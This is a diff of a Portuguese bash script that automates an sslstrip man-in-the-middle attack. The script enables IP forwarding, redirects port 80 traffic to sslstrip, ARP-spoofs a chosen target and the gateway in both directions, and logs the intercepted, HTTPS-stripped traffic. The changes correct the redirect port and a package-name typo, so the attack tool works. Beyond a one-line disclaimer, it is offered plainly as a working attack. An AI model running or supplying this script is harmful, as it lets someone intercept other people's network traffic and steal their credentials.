@@ -1,6 +1,6 @@
 #!/bin/bash
 # Script para automatizar o ataque sslstrip
-# Data: 12-07-2016
+# Historico: 12-07-2016 v0.1
 #
 # Pacotes requeridos: sslstrip, dsniff e xterm
 #
@@ -13,6 +13,8 @@ ARQ=cap_$DATA.log
 
 menu(){
 	echo "########################MENU##############################"
+	echo "########salvando em: $ARQ#############"
+	echo "##########################################################"
 	echo "1. Identificar gateway"
 	echo "2. Identificar target"
 	echo "3. Iniciar"
@@ -24,6 +26,7 @@ menu(){
 		1) get_router ;;
 		2) scan_target ;;
 		3) iniciar_ataque ;;
+		4) install_req ;;
 		99) exit 0 ;;
 		*) echo "Opção Invalida!" ; menu ;;
 	esac
@@ -60,25 +63,25 @@ scan_target(){
 }
 
 iniciar_ataque(){ 
-	echo "> Ativando o ip forward"
+	echo -e "\n ~ Ativando o ip forward"
 	echo 1 > /proc/sys/net/ipv4/ip_forward
-	echo "> Limpando regras da tabela NAT do iptables"
+	echo -e "\n ~ Limpando regras da tabela NAT do iptables"
 	iptables -t nat -F
-	echo "> Redirecionando o trafego da porta 80 para 1000"
-	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
+	echo -e "\n ~ Redirecionando o trafego da porta 80 para 10000"
+	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 	if [ $? -eq 0 ]
 	then
-		echo "[ OK ] Regras criadas com sucesso!"	
+		echo -e "\n [ OK ] Regras criadas com sucesso!"	
  		read -p "> TARGET: " ip_target
 		read -p "> GATEWAY: " ip_router
-		nohup xterm -e "arpspoof -i eth0 $ip_router -t $ip_target" &
-		nohup xterm -e "arpspoof -i eth0 -t $ip_target $ip_router" &
-		echo "> Iniciando o sslstrip..."
-		echo "> Salvando em: $ARQ"	
-		nohup xterm -e "sslstrip -l 10000 -w $ARQ 2> /dev/null" &
-		sleep 1
+		nohup xterm -e 2> /dev/null "arpspoof -i eth0 $ip_router -t $ip_target" &
+		nohup xterm -e 2> /dev/null "arpspoof -i eth0 -t $ip_target $ip_router" &
+		echo -e "\n ~ Iniciando o sslstrip..."
+		echo -e "\n ~ Salvando em: $ARQ"
+		echo -e "\n CAPTURA: $DATA" > $ARQ 2> /dev/null	
+		nohup xterm -e 2> /dev/null "sslstrip -l 10000  >> $ARQ" &	
 	else
-		echo "[ FALHA ] Ocorreram erros em criar regras."
+		echo -e "\n [ FALHA ] Ocorreram erros em criar regras."
 		sleep 2
 		exit 0
 	fi
@@ -86,8 +89,8 @@ iniciar_ataque(){
 }
 
 install_req(){
-	echo "> Essa opção só esta disponivel para debian e derivados"
-	apt-get install dnsiff sslstrip xterm
+	echo -e "\n ~ Essa opção só esta disponivel para debian e derivados"
+	apt-get install dsniff sslstrip xterm
 	if [ $? -eq 0 ]
 	then
 		echo "[ OK ]Os pacotes necessários foram instalados!"
@@ -101,6 +104,8 @@ do
 	if [ $UID -eq 0 ]
 	then
 		echo "O autor não se responsabiliza por qualquer ato feito com má fé utilizando esse script" 
+		sleep 2
+		clear
 		menu
 	else
 		echo "Execute o script como root!"
